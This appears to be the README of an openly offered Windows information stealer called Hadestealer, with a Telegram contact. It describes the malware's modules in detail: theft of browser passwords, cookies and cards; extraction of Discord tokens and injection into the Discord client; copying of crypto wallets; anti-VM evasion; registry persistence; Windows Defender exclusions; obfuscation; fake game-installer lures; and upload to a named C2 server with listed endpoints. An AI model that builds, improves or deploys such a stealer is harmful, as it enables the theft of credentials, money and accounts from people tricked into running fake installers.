Contact : https://t.me/tahammulsuz
BOT project : https://github.com/yanaksalvo/Hades-Stealer-Bot

# 💀 Hadestealer — Stealer Module

Hadestealer is an advanced Windows information stealer built with Electron and TypeScript. It collects browser data, Discord accounts, cryptocurrency wallets, and system credentials, then exfiltrates them as an encrypted ZIP archive to a C2 server. It conceals itself using multi-layered code obfuscation, anti-VM detection, and a convincing fake game installer GUI.

---

## 📁 Project Structure

```
stealer/
├── obfuscator-config.json      # JavaScript obfuscation configuration
├── package.json
├── tsconfig.json
├── extra/
│   └── installer.nsh           # NSIS custom installer script
└── src/
    ├── index.ts                 # Application entry point (Electron main)
    ├── pumb.ts                  # Post-build ASAR encryption hook
    ├── api/
    │   ├── client.ts            # Axios HTTP client
    │   └── sender.ts            # C2 data transmission functions
    ├── browsers/
    │   ├── data.ts              # Chromium database extraction engine
    │   ├── chromium.ts          # Orchestration for Chromium-based browsers
    │   ├── debugWs.ts           # Chrome DevTools Protocol (WebSocket) client
    │   ├── firefox.ts           # Firefox data extraction
    │   ├── opera.ts             # Opera GX data extraction
    │   └── send.ts              # Browser data upload handler
    ├── config/
    │   ├── build-meta.json      # Build metadata
    │   └── constants.ts         # Constants (API endpoints, browser paths, etc.)
    ├── core/
    │   ├── appBound.ts          # CNG / App-bound key decryption
    │   ├── crypto.ts            # AES-GCM / DPAPI decryption
    │   └── helpers.ts           # General helper functions
    ├── discord/
    │   ├── injection.ts         # Discord desktop client injection
    │   └── tokens.ts            # Discord token extraction and validation
    ├── systems/
    │   ├── backup_codes.ts      # Discord backup code search
    │   └── wallet.ts            # Cryptocurrency wallet extraction
    ├── themes/                  # Fake installer GUI themes
    │   ├── 2DGame.html
    │   ├── KittiesMC.html
    │   ├── Minecraft.html
    │   ├── NormalGame.html
    │   ├── VRChat.html
    │   └── WatchTV.html
    ├── types/
    │   └── index.ts             # TypeScript type definitions
    └── utils/
        ├── antivm.ts            # Virtual machine / sandbox detection
        ├── capture.ts           # Screenshot capture
        ├── file.ts              # File system helpers
        ├── nukeBrowsers.ts      # Browser process termination
        ├── process.ts           # Windows native process management
        ├── setupDecrypt.ts      # Decrypt.exe setup
        ├── setupExtractor.ts    # Extractor.exe setup
        └── zip.ts               # ZIP archive creation
```

---

## ⚙️ Configuration

All configuration constants are defined in `src/config/constants.ts`:

| Constant | Description |
|---|---|
| `API_URL` | C2 server base URL (`https://api.hdstlr.net`) |
| `BUILD_ID` | Build identifier sent via `X-Build-ID` header |
| `API_KEY` | API authentication key sent via `X-Api-KEY` header |
| `BROWSER_PATHS` | Profile directory paths for 50+ Chromium-based browsers |
| `WALLET_PATHS` | Directory paths for 12 desktop cryptocurrency wallets |
| `WALLET_EXTENSIONS` | Extension IDs for 6 browser wallet extensions |
| `DISCORD_CLIENTS` | Directory paths for 6 Discord client variants |

---

## 🔄 Execution Flow

```
Start
  │
  ├─► Anti-VM Check ──► If detected → report to C2 & exit
  │
  ├─► Download Tools (Extractor.exe, Decrypt.exe)
  │
  ├─► Data Collection
  │     ├── Chromium browsers (passwords, cookies, cards, history)
  │     ├── Firefox
  │     ├── Opera GX (via WebSocket)
  │     ├── Crypto wallets (desktop + extensions)
  │     ├── Discord tokens
  │     └── Backup codes
  │
  ├─► Screenshot capture (every 90 seconds, continuously)
  │
  ├─► Discord Injection (persistent monitoring)
  │
  ├─► Create ZIP & upload to C2
  │
  └─► Cleanup (delete temp files, kill browsers)
```

---

## 🌐 Browser Data Extraction

### Supported Chromium-Based Browsers (50+)

Chrome, Brave, Microsoft Edge, Vivaldi, Opera, Opera GX, Yandex Browser, Epic Privacy Browser, Comodo Dragon, Torch, Orbitum, and many more.

### Collected Data Types

| Data Type | Description |
|---|---|
| **Passwords** | Decrypted username/password pairs via AES-256-GCM |
| **Cookies** | Session and persistent cookies in Netscape format |
| **Autofills** | Name-value pairs from form history |
| **Credit Cards** | Card number, expiry date, cardholder name |
| **History** | Last 500 visited URLs with timestamps |
| **Downloads** | File paths, sizes, and source URLs |
| **Search History** | Search terms extracted from browser history |

### Master Key Decryption Methods

1. **DPAPI** — Decrypts the master key from the `Local State` file via Windows Data Protection API
2. **CNG (App-Bound)** — Decrypts app-bound keys via Windows Cryptographic Next Generation API
3. **Extractor.exe** — Fallback key extraction tool

### Cookie Extraction Methods

1. **Extension-based** — Injects a Manifest v3 Chrome extension and uses the `cookies` API
2. **Debug port** — Connects via WebSocket using the Chrome DevTools Protocol (CDP)
3. **Direct database access** — Reads encrypted cookies directly from SQLite files

### Firefox

- Reads `logins.json`, `cookies.sqlite`, and `places.sqlite` databases
- Uses the external `Decrypt.exe` tool for password decryption
- Copies files to a temporary directory to avoid file lock issues

---

## 🎮 Discord Token Extraction

The `src/discord/tokens.ts` module collects Discord tokens using multiple methods:

- **LevelDB scan** — Searches `Local Storage` directories for tokens prefixed with `dQw4w9WgXcQ:`
- **JWT pattern matching** — Detects plaintext tokens via regex
- **API validation** — Each token is verified against the Discord API
- **User profile** — Collects email, phone, MFA status, and premium type
- **Friend list** — Enumerates all friend profiles

### Supported Discord Clients

Discord, Discord Canary, Discord PTB, Vesktop, Vencord, BetterDiscord

---

## 💉 Discord Injection

The `src/discord/injection.ts` module injects a JavaScript payload into the Discord desktop client's core module (`app/app_bootstrap/index.js`):

- Hooks Electron's `session.defaultSession.webRequest` API to intercept outgoing requests
- Captures:
  - Login credentials (email / password)
  - Password changes (old and new)
  - 2FA setup secrets
  - Authorization tokens
- All intercepted data is forwarded to the C2 server via the `/collect` endpoint
- Discord client is restarted after injection to apply changes

---

## 💰 Cryptocurrency Wallet Extraction

The `src/systems/wallet.ts` module targets two types of wallets:

### Desktop Wallets (12 Targets)

Exodus, Electrum, Atomic Wallet, Coinomi, Guarda, Armory, Zcash, Bytecoin, DashCore, Ethereum, Jaxx, Binance Desktop

- Copies wallet directories (up to 50 files per wallet, 2 levels deep)
- Generates a report with file sizes and paths

### Browser Extension Wallets (6 Targets)

MetaMask, Binance Chain Wallet, Phantom, Coinbase Wallet, Trust Wallet, Martian Aptos Wallet

- Copies IndexedDB / LevelDB storage from `Local Extension Settings/[extension-id]` directories

---

## 🔐 Encryption & Cryptography

Modules: `src/core/crypto.ts` and `src/core/appBound.ts`

| Method | Purpose |
|---|---|
| **AES-256-GCM** | Decrypts Chromium passwords and cookies (v10, v11, v20, v80 prefixes) |
| **DPAPI** | Decrypts the master key from `Local State` (Windows native API) |
| **CNG** | Decrypts app-bound keys (requires system context) |
| **AES-256-CBC** | Encrypts the ASAR package post-build (`pumb.ts`) |

- Windows native API calls are made via the `koffi` FFI library
- `SeDebugPrivilege` is escalated when required
- LSASS process impersonation is supported for elevated decryption

---

## 🛡️ Anti-VM Detection

The `src/utils/antivm.ts` module detects virtual environments using the following methods:

### Hardware Checks
- RAM < 4 GB or CPU core count < 2
- Known VM CPU model strings (VirtualBox, VMware, QEMU, Hyper-V, Xen)

### BIOS / System Info
- WMIC queries for manufacturer name strings
- Cloud provider detection (AWS EC2, Google Cloud, Azure, Alibaba)

### Process Blacklist
- **Debuggers:** OllyDbg, x64dbg, IDA Pro, Ghidra, Binary Ninja
- **Monitoring tools:** Wireshark, Process Monitor, Fiddler, Burp Suite
- **Analysis tools:** Cheat Engine, ResourceHacker, API Monitor

If a threat is detected, the machine fingerprint is sent to the C2 server and the application exits.

---

## 📡 C2 Communication

**Base URL:** `https://api.hdstlr.net`

**Authentication Headers:**
```
X-Build-ID: <BUILD_ID>
X-Api-KEY: <API_KEY>
```

| Endpoint | Data Sent |
|---|---|
| `POST /discord` | Discord tokens, user info, friend list |
| `POST /browser` | ZIP archive (browser data) + folder summary |
| `POST /files` | Wallets, backup codes, etc. |
| `POST /log` | General status messages |
| `POST /antivm` | VM detection results |
| `POST /err` | Error reports |
| `POST /capture` | Base64-encoded screenshot (every 90 seconds) |
| `POST /collect` | Credentials intercepted via Discord injection |

---

## 🎭 Fake Installer GUI (Themes)

The HTML files in `src/themes/` display a fake game installer interface inside an Electron window:

| Theme | Fake Identity |
|---|---|
| `2DGame.html` | 2D Game Installer |
| `KittiesMC.html` | KittiesMC Installer |
| `Minecraft.html` | Minecraft Installer |
| `NormalGame.html` | Generic Game Installer |
| `VRChat.html` | VRChat Installer |
| `WatchTV.html` | WatchTV Installer |

**Features:**
- Multi-language support (EN, PT, DE, FR, ES)
- Realistic animated progress bar (~90 seconds)
- Fake hardware and technical report display
- EULA-style legal clause presentation
- Final fake "Memory Violation" error to disguise exit
- Draggable window for added legitimacy

---

## 💾 Temporary File Structure

All collected data is staged in `%TEMP%\Hadestealer\All\`:

```
%TEMP%\Hadestealer\All\
├── [Browser Name]/
│   └── [Profile Name]/
│       ├── passwords.txt
│       ├── cookies.txt
│       ├── autofills.txt
│       ├── history.txt
│       ├── downloads.txt
│       └── search_history.txt
├── Firefox/
│   ├── Passwords.txt
│   ├── Cookies.txt
│   ├── History.txt
│   └── Bookmarks.txt
├── Opera GX/
│   ├── passwords.txt
│   ├── autofills.txt
│   └── OperaGX-Cookies.txt
├── Discord/
│   └── (backup code files)
├── Wallet/
│   ├── (wallet folders)
│   └── Wallets.txt (report)
└── allCreditData.txt
```

All collected data is compressed into a single ZIP archive and uploaded to the C2 server.

---

## 🔧 Build Process

### Build Pipeline

```bash
npm run build:ts        # TypeScript compilation
npm run build:bundle    # Bundle optimization
npm run build:minify    # Minification via Terser
npm run build:obfuscate # JavaScript obfuscation
npm run build:bytecode  # Electron bytecode compilation
npm run build:loader    # Custom loader creation
npm run build           # Full build (all steps)
npm run dist            # Create NSIS installer package
```

### Obfuscation Configuration (`obfuscator-config.json`)

| Feature | Value |
|---|---|
| Control flow flattening | Enabled (75% threshold) |
| Dead code injection | Enabled (40% threshold) |
| String array encoding | RC4 |
| Identifier names | Hexadecimal |
| Self-defending code | Enabled |
| Property transformation | Enabled |

### ASAR Encryption (`pumb.ts`)

After the build, the `app.asar` package is encrypted with AES-256-CBC, preventing easy extraction of source code from the packaged application.

---

## 🪟 Installer (NSIS)

The `extra/installer.nsh` script performs the following actions post-installation:

1. **Persistence:** Adds a registry `Run` key for auto-start on every boot  
   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (with `--startup` flag)

2. **Windows Defender Bypass:** Adds the installation directory, `.exe` and `.jsc` file extensions, and the process name to Windows Defender exclusion lists

---

## 📦 Dependencies

| Package | Description |
|---|---|
| `electron` | Application framework (v40) |
| `electron-builder` | NSIS installer generator |
| `koffi` | Windows native API FFI bindings (DPAPI, CNG, process management) |
| `sqlite3` | Reading browser SQLite databases |
| `datavault-win` | DPAPI encryption/decryption |
| `axios` | HTTP requests to the C2 server |
| `adm-zip` | ZIP archive creation for data exfiltration |
| `ws` | WebSocket client for Chrome DevTools Protocol |
| `javascript-obfuscator` | Build-time code obfuscation |

---

## 📋 Development Notes

- `src/index.ts` is the Electron `main` process; there is no renderer process (the window is hidden).
- `pumb.ts` runs as the final step of the build pipeline and encrypts the ASAR file in place.
- All paths in `constants.ts` are based on Windows environment variables (`%LOCALAPPDATA%`, `%APPDATA%`, `%TEMP%`).
- The build process uses `electron-rebuild` to recompile native modules (`koffi`, `sqlite3`, `datavault-win`) against the target Electron version.
- The Electron window is kept hidden with `transparent: true`, `frame: false`, `alwaysOnTop: true`; only the fake theme HTML is displayed to the user.
